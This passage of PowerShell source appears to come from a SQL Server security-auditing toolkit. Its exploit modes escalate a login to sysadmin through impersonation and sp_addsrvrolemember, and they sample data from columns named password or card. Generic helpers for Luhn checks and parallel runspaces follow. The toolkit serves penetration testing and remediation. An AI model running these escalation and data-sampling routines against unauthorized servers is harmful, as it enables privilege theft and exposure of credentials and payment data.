        Vulnerability : PERMISSION - IMPERSONATE LOGIN
        Description   : The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges.
        Remediation   : Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON 
                        Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]
        Severity      : High
        IsVulnerable  : Yes
        IsExploitable : Yes
        Exploited     : Yes
        ExploitCmd    : Invoke-SQLEscalate-ImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Exploit
        Details       : public can impersonate the sa SYSADMIN login. This test was ran with the evil login.
        Reference     : https://msdn.microsoft.com/en-us/library/ms181362.aspx
        Author        : Scott Sutherland (@_nullbind), NetSPI 2016
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,       

        [Parameter(Mandatory=$false,
        HelpMessage="Don't output anything.")]
        [string]$NoOutput,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Exploit vulnerable issues.")]
        [switch]$Exploit
    )

    Begin
    {                
        # Table for output
        $TblData = New-Object System.Data.DataTable 
        $TblData.Columns.Add("ComputerName") | Out-Null
        $TblData.Columns.Add("Instance") | Out-Null
        $TblData.Columns.Add("Vulnerability") | Out-Null
        $TblData.Columns.Add("Description") | Out-Null
        $TblData.Columns.Add("Remediation") | Out-Null
        $TblData.Columns.Add("Severity") | Out-Null
        $TblData.Columns.Add("IsVulnerable") | Out-Null
        $TblData.Columns.Add("IsExploitable") | Out-Null
        $TblData.Columns.Add("Exploited") | Out-Null
        $TblData.Columns.Add("ExploitCmd") | Out-Null
        $TblData.Columns.Add("Details") | Out-Null    
        $TblData.Columns.Add("Reference") | Out-Null   
        $TblData.Columns.Add("Author") | Out-Null   
    }

    Process
    {   
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Status user
        Write-Verbose "$Instance : START VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"  
   
        # Test connection to server
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if(-not $TestConnection){   
            
            # Status user
            Write-Verbose "$Instance : CONNECTION FAILED."
            Write-Verbose "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"         
            Return
        }else{
            Write-Verbose "$Instance : CONNECTION SUCCESS."
        }

        # Grab server information
        $ServerInfo =  Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential 
        $CurrentLogin = $ServerInfo.CurrentLogin

        # ---------------------------------------------------------------      
        # Set function meta data for report output
        # ---------------------------------------------------------------   
        if($Exploit){
            $TestMode  = "Exploit"
        }else{
            $TestMode  = "Audit"
        }         
        $Vulnerability = "PERMISSION - IMPERSONATE LOGIN"
        $Description   = "The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges."
        $Remediation   = "Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]"
        $Severity      = "High"
        $IsVulnerable  = "No"
        $IsExploitable = "No" 
        $Exploited     = "No"     
        $ExploitCmd    = "Invoke-SQLEscalate-ImpersonateLogin -Instance $Instance -Exploit"
        $Details       = ""   
        $Reference     = "https://msdn.microsoft.com/en-us/library/ms181362.aspx"       
        $Author        = "Scott Sutherland (@_nullbind), NetSPI 2016"        

        # ---------------------------------------------------------------     
        # Check for Vulnerability
        # ---------------------------------------------------------------       
       
        # Get list of SQL Server logins that can be impersonated by the current login
        $ImpersonationList =  Get-SQLServerPriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential | Where-Object {$_.PermissionName -like "IMPERSONATE"}        

        # Check if any SQL Server logins can be impersonated       
        if($ImpersonationList){

            # Status user
            Write-Verbose "$Instance : - Logins can be impersonated."
            $IsVulnerable = "Yes"

            # ---------------------------------------------------------------     
            # Check if Vulnerability is Exploitable 
            # --------------------------------------------------------------- 

            # Iterate through each affected login and check if they are a sysadmin
            $ImpersonationList |
            ForEach-Object {

                # Grab grantee and impersonable login
                $ImpersonatedLogin = $_.ObjectName
                $GranteeName = $_.GranteeName 
                
                # Check if impersonable login is a sysadmin                  
                $ImpLoginSysadminStatus =  Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$ImpersonatedLogin') as Status" | Select-Object Status -ExpandProperty Status                   
                If($ImpLoginSysadminStatus -eq 1){

                    #Status user
                    Write-Verbose "$Instance : - $GranteeName can impersonate the $ImpersonatedLogin sysadmin login."
                    $IsExploitable = "Yes"
                    $Details = "$GranteeName can impersonate the $ImpersonatedLogin SYSADMIN login. This test was ran with the $CurrentLogin login."

                    # ---------------------------------------------------------------     
                    # Exploit Vulnerability
                    # ---------------------------------------------------------------  
                    if($Exploit){
                        
                        # Status user
                        Write-Verbose "$Instance : - EXPLOITING: Starting exploit process..."

                        # Check if user is already a sysadmin
                        $SysadminPreCheck =  Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" | Select-Object Status -ExpandProperty Status                                            
                        if($SysadminPreCheck -eq 0){

                            # Status user
                            Write-Verbose "$Instance : - EXPLOITING: Verified that the current user ($CurrentLogin) is NOT a sysadmin."
                            Write-Verbose "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role by impersonating $ImpersonatedLogin..."                            
                            
                            # Attempt to add the current login to sysadmins fixed server role
                             Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXECUTE AS LOGIN = '$ImpersonatedLogin';EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin';Revert" | Out-Null                                              

                            # Verify the login was added successfully
                            $SysadminPostCheck =  Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" | Select-Object Status -ExpandProperty Status               
                            if($SysadminPostCheck -eq 1){
                                Write-Verbose "$Instance : - EXPLOITING: It was possible to make the current user ($CurrentLogin) a sysadmin!"
                                $Exploited = "Yes"
                            }else{
                                Write-Verbose "$Instance : - EXPLOITING: It was not possible to make the current user ($CurrentLogin) a sysadmin."
                            }
                        }else{
                       
                            # Status user
                            Write-Verbose "$Instance : - EXPLOITING: The current login ($CurrentLogin) is already a sysadmin. No privilege escalation needed."
                            $Exploited = "No"
                        }
                    }

                }else{

                    # Status user
                    Write-Verbose "$Instance : - $GranteeName can impersonate the $ImpersonatedLogin login (not a sysadmin)."
                    $Details = "$GranteeName can impersonate the $ImpersonatedLogin login (not a sysadmin). This test was ran with the $CurrentLogin login."
                    $IsExploitable = "No"
                }
            
            # Add record
            $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null
            }
        }else{

            # Status user
            Write-Verbose "$Instance : - No logins could be impersonated."
        }

        # Status user
        Write-Verbose "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"    
    }

    End
    {   
        # Return data  
        if ( -not $NoOutput){            
            Return $TblData       
        }
    }
}


# ---------------------------------------
# Invoke-SQLEscalate-SampleDataByColumn
# ---------------------------------------
# Author: Scott Sutherland
Function Invoke-SQLEscalate-SampleDataByColumn {
<#
    .SYNOPSIS
        Check if the current login can access any database columns that contain the word password. Supports column name keyword search and custom data sample size. 
        Note: For cleaner data sample output use the Get-SQLColumnSampleData function.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER NoOutput
        Don't output anything.
    .PARAMETER Exploit
        Exploit vulnerable issues
    .PARAMETER SampleSize
        Number of records to sample.
    .PARAMETER Keyword
        Column name to search for.
    .EXAMPLE
        PS C:\> Invoke-SQLEscalate-SampleDataByColumn -Instance SQLServer1\STANDARDDEV2014 -Keyword card -SampleSize 2 -Exploit

        ComputerName  : SQLServer1
        Instance      : SQLServer1\STANDARDDEV2014
        Vulnerability : Potentially Sensitive Columns Found
        Description   : Columns were found in non default databases that may contain sensitive information.
        Remediation   : Ensure that all passwords and senstive data are masked, hashed, or encrypted.
        Severity      : Informational
        IsVulnerable  : Yes
        IsExploitable : Yes
        Exploited     : Yes
        ExploitCmd    : Invoke-SQLEscalate-SampleDataByColumn -Instance SQLServer1\STANDARDDEV2014 -Exploit
        Details       : Data sample from [testdb].[dbo].[tracking].[card] : "4111111111111111" "4111111111111112".
        Reference     : https://msdn.microsoft.com/en-us/library/ms188348.aspx
        Author        : Scott Sutherland (@_nullbind), NetSPI 2016
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,       

        [Parameter(Mandatory=$false,
        HelpMessage="Don't output anything.")]
        [string]$NoOutput,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Exploit vulnerable issues.")]
        [switch]$Exploit,

        [Parameter(Mandatory=$false,
        HelpMessage="Number of records to sample.")]
        [int]$SampleSize = 1,

        [Parameter(Mandatory=$false,
        HelpMessage=" Column name to search for.")]
        [string]$Keyword = "Password"
    )

    Begin
    {                         
        # Table for output               
        $TblData = New-Object System.Data.DataTable 
        $TblData.Columns.Add("ComputerName") | Out-Null
        $TblData.Columns.Add("Instance") | Out-Null
        $TblData.Columns.Add("Vulnerability") | Out-Null
        $TblData.Columns.Add("Description") | Out-Null
        $TblData.Columns.Add("Remediation") | Out-Null
        $TblData.Columns.Add("Severity") | Out-Null
        $TblData.Columns.Add("IsVulnerable") | Out-Null
        $TblData.Columns.Add("IsExploitable") | Out-Null
        $TblData.Columns.Add("Exploited") | Out-Null
        $TblData.Columns.Add("ExploitCmd") | Out-Null
        $TblData.Columns.Add("Details") | Out-Null    
        $TblData.Columns.Add("Reference") | Out-Null   
        $TblData.Columns.Add("Author") | Out-Null   
    }

    Process
    {   
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Status User
        Write-Verbose "$Instance : START VULNERABILITY CHECK: SEARCH DATA BY COLUMN" 

        # Test connection to server
        $TestConnection =  Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object {$_.Status -eq "Accessible"}
        if(-not $TestConnection){   
            
            # Status user
            Write-Verbose "$Instance : CONNECTION FAILED"
            Write-Verbose "$Instance : COMPLETED VULNERABILITY CHECK: SEARCH DATA BY COLUMN"           
            Return
        }else{
            Write-Verbose "$Instance : CONNECTION SUCCESS"
        }

        # --------------------------------------------     
        # Set function meta data for report output
        # --------------------------------------------  
        if($Exploit){
            $TestMode  = "Exploit"
        }else{
            $TestMode  = "Audit"
        }      
        $Vulnerability = "Potentially Sensitive Columns Found"
        $Description   = "Columns were found in non default databases that may contain sensitive information."
        $Remediation   = "Ensure that all passwords and senstive data are masked, hashed, or encrypted."
        $Severity      = "Informational"
        $IsVulnerable  = "No"
        $IsExploitable = "No" 
        $Exploited     = "No"
        $ExploitCmd    = "Invoke-SQLEscalate-SampleDataByColumn -Instance $Instance -Exploit"
        $Details       = ""   
        $Reference     = "https://msdn.microsoft.com/en-us/library/ms188348.aspx"       
        $Author        = "Scott Sutherland (@_nullbind), NetSPI 2016"         
        
        # -----------------------------------------------------------------     
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------  
        Write-Verbose "$Instance : - Searching for column names that match criteria..."    
        $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -ColumnNameSearch $Keyword -NoDefaults
        if($Columns){
            $IsVulnerable  = "Yes"
        }else{
            $IsVulnerable  = "No"
        }
        
        # -----------------------------------------------------------------     
        # Check for exploit dependancies 
        # Note: Typically secondary configs required for dba/os execution
        # -----------------------------------------------------------------
        if($IsVulnerable -eq "Yes"){
           
            # List affected columns
            $Columns|
            ForEach-Object {    
            
                $DatabaseName = $_.DatabaseName
                $SchemaName = $_.SchemaName
                $TableName = $_.TableName
                $ColumnName = $_.ColumnName
                $AffectedColumn = "[$DatabaseName].[$SchemaName].[$TableName].[$ColumnName]"
                $AffectedTable = "[$DatabaseName].[$SchemaName].[$TableName]"
                $Query = "USE $DatabaseName; SELECT TOP $SampleSize [$ColumnName] FROM $AffectedTable "

                Write-Verbose "$Instance : - Column match: $AffectedColumn"

                # ------------------------------------------------------------------    
                # Exploit Vulnerability
                # Note: Add the current user to sysadmin fixed server role, get data
                # ------------------------------------------------------------------
                if($Exploit){

                    $TblTargetColumns |
                    ForEach-Object {

                        # Add sample data
                        Write-Verbose "$Instance : - EXPLOITING: Selecting data sample from column $AffectedColumn."

                        # Query for data
                        $DataSample = Get-SqlQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $Query | ConvertTo-Csv -NoTypeInformation | Select-Object -skip 1
                        if($DataSample){ 
                            $Details = "Data sample from $AffectedColumn : $DataSample." 
                        }else{
                            $Details = "No data found in affected column: $AffectedColumn." 
                        }
                        $IsExploitable = "Yes"
                        $Exploited = "Yes"

                        # Add record
                        $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null                                                                        
                    }
                }else{

                    # Add affected column list
                    $Details = "Affected column: $AffectedColumn." 
                    $IsExploitable = "Yes"
                    $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author) | Out-Null                                                                        
                }
            }                             
        }else{
            Write-Verbose "$Instance : - No columns were found that matched the search."
        } 
                
        # Status User
        Write-Verbose "$Instance : COMPLETED VULNERABILITY CHECK: SEARCH DATA BY COLUMN" 
    }

    End
    {   
        # Return data  
        if ( -not $NoOutput){            
            Return $TblData       
        }
    }
}
#endregion

#########################################################################
#
#region          THIRD PARTY FUNCTIONS
#
#########################################################################

# -------------------------------------------
# Function: Test-IsLuhnValid 
# -------------------------------------------
# Author: ØYVIND KALLSTAD
# Source: https://communary.net/2016/02/19/the-luhn-algorithm/
function Test-IsLuhnValid {
    <#
        .SYNOPSIS
            Valdidate a number based on the Luhn Algorithm.
        .DESCRIPTION
            This function uses the Luhn algorithm to validate a number that includes
            the Luhn checksum digit.
        .EXAMPLE
            Test-IsLuhnValid -Number 1234567890123452
            This will validate whether the number is valid according to the Luhn Algorithm.
        .INPUTS
            System.UInt64
        .OUTPUTS
            System.Boolean
        .NOTES
            Author: Øyvind Kallstad
            Date: 19.02.2016
            Version: 1.0
            Dependencies: Get-LuhnCheckSum, ConvertTo-Digits
        .LINKS
            https://en.wikipedia.org/wiki/Luhn_algorithm
            https://communary.wordpress.com/
            https://github.com/gravejester/Communary.ToolBox
    #>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline = $true)]
        [uint64]$Number
    )

    $numberDigits = ConvertTo-Digits -Number $Number
    $checksumDigit = $numberDigits[-1]
    $numberWithoutChecksumDigit = $numberDigits[0..($numberDigits.Count - 2)] -join ''
    $checksum = Get-LuhnCheckSum -Number $numberWithoutChecksumDigit

    if ((($checksum + $checksumDigit) % 10) -eq 0) {
        Write-Output $true
    }
    else {
        Write-Output $false
    }
}


# -------------------------------------------
# Function: ConvertTo-Digits
# -------------------------------------------
# Author: ØYVIND KALLSTAD
# Source: https://communary.net/2016/02/19/the-luhn-algorithm/
function ConvertTo-Digits {
    <#
        .SYNOPSIS
            Convert an integer into an array of bytes of its individual digits.
        .DESCRIPTION
            Convert an integer into an array of bytes of its individual digits.
        .EXAMPLE
            ConvertTo-Digits 145
        .INPUTS
            System.UInt64
        .LINK
            https://communary.wordpress.com/
            https://github.com/gravejester/Communary.ToolBox
        .NOTES
            Author: Øyvind Kallstad
            Date: 09.05.2015
            Version: 1.0
    #>
    [OutputType([System.Byte[]])]
    [CmdletBinding()]
    param(
        [Parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true)]
        [uint64]$Number
    )
    $n = $Number
    $numberOfDigits = 1 + [convert]::ToUInt64([math]::Floor(([math]::Log10($n))))
    $digits = New-Object Byte[] $numberOfDigits
    for ($i = ($numberOfDigits - 1); $i -ge 0; $i--) {
        $digit = $n % 10
        $digits[$i] = $digit
        $n = [math]::Floor($n / 10)
    }
    Write-Output $digits
}


# -------------------------------------------
# Function: Invoke-Parallel
# -------------------------------------------
# Author: RamblingCookieMonster
# Source: https://github.com/RamblingCookieMonster/Invoke-Parallel
# Notes: Added "ImportSessionFunctions" to import custom functions from the current session into the runspace pool.
function Invoke-Parallel {
    <#
    .SYNOPSIS
        Function to control parallel processing using runspaces

    .DESCRIPTION
        Function to control parallel processing using runspaces

            Note that each runspace will not have access to variables and commands loaded in your session or in other runspaces by default.  
            This behaviour can be changed with parameters.

    .PARAMETER ScriptFile
        File to run against all input objects.  Must include parameter to take in the input object, or use $args.  Optionally, include parameter to take in parameter.  Example: C:\script.ps1

    .PARAMETER ScriptBlock
        Scriptblock to run against all computers.

        You may use $Using:<Variable> language in PowerShell 3 and later.
        
            The parameter block is added for you, allowing behaviour similar to foreach-object:
                Refer to the input object as $_.
                Refer to the parameter parameter as $parameter

    .PARAMETER InputObject
        Run script against these specified objects.

    .PARAMETER Parameter
        This object is passed to every script block.  You can use it to pass information to the script block; for example, the path to a logging folder
        
            Reference this object as $parameter if using the scriptblock parameterset.

    .PARAMETER ImportVariables
        If specified, get user session variables and add them to the initial session state

    .PARAMETER ImportModules
        If specified, get loaded modules and pssnapins, add them to the initial session state

    .PARAMETER Throttle
        Maximum number of threads to run at a single time.

    .PARAMETER SleepTimer
        Milliseconds to sleep after checking for completed runspaces and in a few other spots.  I would not recommend dropping below 200 or increasing above 500

    .PARAMETER RunspaceTimeout
        Maximum time in seconds a single thread can run.  If execution of your code takes longer than this, it is disposed.  Default: 0 (seconds)

        WARNING:  Using this parameter requires that maxQueue be set to throttle (it will be by default) for accurate timing.  Details here:
        http://gallery.technet.microsoft.com/Run-Parallel-Parallel-377fd430

    .PARAMETER NoCloseOnTimeout
		Do not dispose of timed out tasks or attempt to close the runspace if threads have timed out. This will prevent the script from hanging in certain situations where threads become non-responsive, at the expense of leaking memory within the PowerShell host.

    .PARAMETER MaxQueue
        Maximum number of powershell instances to add to runspace pool.  If this is higher than $throttle, $timeout will be inaccurate
        
        If this is equal or less than throttle, there will be a performance impact

        The default value is $throttle times 3, if $runspaceTimeout is not specified
        The default value is $throttle, if $runspaceTimeout is specified

    .PARAMETER LogFile
        Path to a file where we can log results, including run time for each thread, whether it completes, completes with errors, or times out.

	.PARAMETER Quiet
		Disable progress bar.

    .EXAMPLE
        Each example uses Test-ForPacs.ps1 which includes the following code:
            param($computer)

            if(test-connection $computer -count 1 -quiet -BufferSize 16){
                $object = [pscustomobject] @{
                    Computer=$computer;
                    Available=1;
                    Kodak=$(
                        if((test-path "\\$computer\c$\users\public\desktop\Kodak Direct View Pacs.url") -or (test-path "\\$computer\c$\documents and settings\all users

        \desktop\Kodak Direct View Pacs.url") ){"1"}else{"0"}
                    )
                }
            }
            else{
                $object = [pscustomobject] @{
                    Computer=$computer;
                    Available=0;
                    Kodak="NA"
                }
            }

            $object

    .EXAMPLE
        Invoke-Parallel -scriptfile C:\public\Test-ForPacs.ps1 -inputobject $(get-content C:\pcs.txt) -runspaceTimeout 10 -throttle 10

            Pulls list of PCs from C:\pcs.txt,
            Runs Test-ForPacs against each
            If any query takes longer than 10 seconds, it is disposed
            Only run 10 threads at a time

    .EXAMPLE
        Invoke-Parallel -scriptfile C:\public\Test-ForPacs.ps1 -inputobject c-is-ts-91, c-is-ts-95

            Runs against c-is-ts-91, c-is-ts-95 (-computername)
            Runs Test-ForPacs against each

    .EXAMPLE
        $stuff = [pscustomobject] @{
            ContentFile = "windows\system32\drivers\etc\hosts"
            Logfile = "C:\temp\log.txt"
        }
    
        $computers | Invoke-Parallel -parameter $stuff {
            $contentFile = join-path "\\$_\c$" $parameter.contentfile
            Get-Content $contentFile |
                set-content $parameter.logfile
        }

        This example uses the parameter argument.  This parameter is a single object.  To pass multiple items into the script block, we create a custom object (using a PowerShell v3 language) with properties we want to pass in.

        Inside the script block, $parameter is used to reference this parameter object.  This example sets a content file, gets content from that file, and sets it to a predefined log file.

    .EXAMPLE
        $test = 5
        1..2 | Invoke-Parallel -ImportVariables {$_ * $test}

        Add variables from the current session to the session state.  Without -ImportVariables $Test would not be accessible

    .EXAMPLE
        $test = 5
        1..2 | Invoke-Parallel {$_ * $Using:test}

        Reference a variable from the current session with the $Using:<Variable> syntax.  Requires PowerShell 3 or later. Note that -ImportVariables parameter is no longer necessary.

    .FUNCTIONALITY
        PowerShell Language

    .NOTES
        Credit to Boe Prox for the base runspace code and $Using implementation
            http://learn-powershell.net/2012/05/10/speedy-network-information-query-using-powershell/
            http://gallery.technet.microsoft.com/scriptcenter/Speedy-Network-Information-5b1406fb#content
            https://github.com/proxb/PoshRSJob/

        Credit to T Bryce Yehl for the Quiet and NoCloseOnTimeout implementations

        Credit to Sergei Vorobev for the many ideas and contributions that have improved functionality, reliability, and ease of use

    .LINK
        https://github.com/RamblingCookieMonster/Invoke-Parallel
    #>
    [cmdletbinding(DefaultParameterSetName='ScriptBlock')]
    Param (   
        [Parameter(Mandatory=$false,position=0,ParameterSetName='ScriptBlock')]
            [System.Management.Automation.ScriptBlock]$ScriptBlock,

        [Parameter(Mandatory=$false,ParameterSetName='ScriptFile')]
        [ValidateScript({test-path $_ -pathtype leaf})]
            $ScriptFile,

        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [Alias('CN','__Server','IPAddress','Server','ComputerName')]    
            [PSObject]$InputObject,

            [PSObject]$Parameter,

            [switch]$ImportSessionFunctions,

            [switch]$ImportVariables,

            [switch]$ImportModules,

            [int]$Throttle = 20,

            [int]$SleepTimer = 200,

            [int]$RunspaceTimeout = 0,

			[switch]$NoCloseOnTimeout = $false,

            [int]$MaxQueue,

        [validatescript({Test-Path (Split-Path $_ -parent)})]
            [string]$LogFile = "C:\temp\log.log",

			[switch] $Quiet = $false
    )
    
    Begin {
                
        #No max queue specified?  Estimate one.
        #We use the script scope to resolve an odd PowerShell 2 issue where MaxQueue isn't seen later in the function
        if( -not $PSBoundParameters.ContainsKey('MaxQueue') )
        {
            if($RunspaceTimeout -ne 0){ $script:MaxQueue = $Throttle }
            else{ $script:MaxQueue = $Throttle * 3 }
        }
        else
        {
            $script:MaxQueue = $MaxQueue
        }

        #Write-Verbose "Throttle: '$throttle' SleepTimer '$sleepTimer' runSpaceTimeout '$runspaceTimeout' maxQueue '$maxQueue' logFile '$logFile'"

        #If they want to import variables or modules, create a clean runspace, get loaded items, use those to exclude items
        if ($ImportVariables -or $ImportModules)
        {
            $StandardUserEnv = [powershell]::Create().addscript({

                #Get modules and snapins in this clean runspace
                $Modules = Get-Module | Select -ExpandProperty Name
                $Snapins = Get-PSSnapin | Select -ExpandProperty Name

                #Get variables in this clean runspace
                #Called last to get vars like $? into session
                $Variables = Get-Variable | Select -ExpandProperty Name
                
                #Return a hashtable where we can access each.
                @{
                    Variables = $Variables
                    Modules = $Modules
                    Snapins = $Snapins
                }
            }).invoke()[0]
            
            if ($ImportVariables) {
                #Exclude common parameters, bound parameters, and automatic variables
                Function _temp {[cmdletbinding()] param() }
                $VariablesToExclude = @( (Get-Command _temp | Select -ExpandProperty parameters).Keys + $PSBoundParameters.Keys + $StandardUserEnv.Variables )
                #Write-Verbose "Excluding variables $( ($VariablesToExclude | sort ) -join ", ")"

                # we don't use 'Get-Variable -Exclude', because it uses regexps. 
                # One of the veriables that we pass is '$?'. 
                # There could be other variables with such problems.
                # Scope 2 required if we move to a real module
                $UserVariables = @( Get-Variable | Where { -not ($VariablesToExclude -contains $_.Name) } ) 
                #Write-Verbose "Found variables to import: $( ($UserVariables | Select -expandproperty Name | Sort ) -join ", " | Out-String).`n"

            }

            if ($ImportModules) 
            {
                $UserModules = @( Get-Module | Where {$StandardUserEnv.Modules -notcontains $_.Name -and (Test-Path $_.Path -ErrorAction SilentlyContinue)} | Select -ExpandProperty Path )
                $UserSnapins = @( Get-PSSnapin | Select -ExpandProperty Name | Where {$StandardUserEnv.Snapins -notcontains $_ } ) 
            }
        }

        #region functions
            
            Function Get-RunspaceData {
                [cmdletbinding()]
                param( [switch]$Wait )

                #loop through runspaces
                #if $wait is specified, keep looping until all complete
                Do {

                    #set more to false for tracking completion
                    $more = $false

                    #Progress bar if we have inputobject count (bound parameter)
                    if (-not $Quiet) {
						Write-Progress  -Activity "Running Query" -Status "Starting threads"`
							-CurrentOperation "$startedCount threads defined - $totalCount input objects - $script:completedCount input objects processed"`
							-PercentComplete $( Try { $script:completedCount / $totalCount * 100 } Catch {0} )
					}

                    #run through each runspace.           
                    Foreach($runspace in $runspaces) {
                    
                        #get the duration - inaccurate
                        $currentdate = Get-Date
                        $runtime = $currentdate - $runspace.startTime
                        $runMin = [math]::Round( $runtime.totalminutes ,2 )

                        #set up log object
                        $log = "" | select Date, Action, Runtime, Status, Details
                        $log.Action = "Removing:'$($runspace.object)'"
                        $log.Date = $currentdate
                        $log.Runtime = "$runMin minutes"

                        #If runspace completed, end invoke, dispose, recycle, counter++
                        If ($runspace.Runspace.isCompleted) {
                            
                            $script:completedCount++
                        
                            #check if there were errors
                            if($runspace.powershell.Streams.Error.Count -gt 0) {
                                
                                #set the logging info and move the file to completed
                                $log.status = "CompletedWithErrors"
                                #Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                                foreach($ErrorRecord in $runspace.powershell.Streams.Error) {
                                    Write-Error -ErrorRecord $ErrorRecord
                                }
                            }
                            else {
                                
                                #add logging details and cleanup
                                $log.status = "Completed"
                                #Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                            }

                            #everything is logged, clean up the runspace
                            $runspace.powershell.EndInvoke($runspace.Runspace)
                            $runspace.powershell.dispose()
                            $runspace.Runspace = $null
                            $runspace.powershell = $null

                        }

                        #If runtime exceeds max, dispose the runspace
                        ElseIf ( $runspaceTimeout -ne 0 -and $runtime.totalseconds -gt $runspaceTimeout) {
                            
                            $script:completedCount++
                            $timedOutTasks = $true
                            
							#add logging details and cleanup
                            $log.status = "TimedOut"
                            #Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                            Write-Error "Runspace timed out at $($runtime.totalseconds) seconds for the object:`n$($runspace.object | out-string)"

                            #Depending on how it hangs, we could still get stuck here as dispose calls a synchronous method on the powershell instance
                            if (!$noCloseOnTimeout) { $runspace.powershell.dispose() }
                            $runspace.Runspace = $null
                            $runspace.powershell = $null
                            $completedCount++

                        }
                   
                        #If runspace isn't null set more to true  
                        ElseIf ($runspace.Runspace -ne $null ) {
                            $log = $null
                            $more = $true
                        }

                        #log the results if a log file was indicated
                        if($logFile -and $log){
                            ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1] | out-file $LogFile -append
                        }
                    }

                    #Clean out unused runspace jobs
                    $temphash = $runspaces.clone()
                    $temphash | Where { $_.runspace -eq $Null } | ForEach {
                        $Runspaces.remove($_)
                    }

                    #sleep for a bit if we will loop again
                    if($PSBoundParameters['Wait']){ Start-Sleep -milliseconds $SleepTimer }

                #Loop again only if -wait parameter and there are more runspaces to process
                } while ($more -and $PSBoundParameters['Wait'])
                
            #End of runspace function
            }

        #endregion functions
        
        #region Init

            if($PSCmdlet.ParameterSetName -eq 'ScriptFile')
            {
                $ScriptBlock = [scriptblock]::Create( $(Get-Content $ScriptFile | out-string) )
            }
            elseif($PSCmdlet.ParameterSetName -eq 'ScriptBlock')
            {
                #Start building parameter names for the param block
                [string[]]$ParamsToAdd = '$_'
                if( $PSBoundParameters.ContainsKey('Parameter') )
                {
                    $ParamsToAdd += '$Parameter'
                }

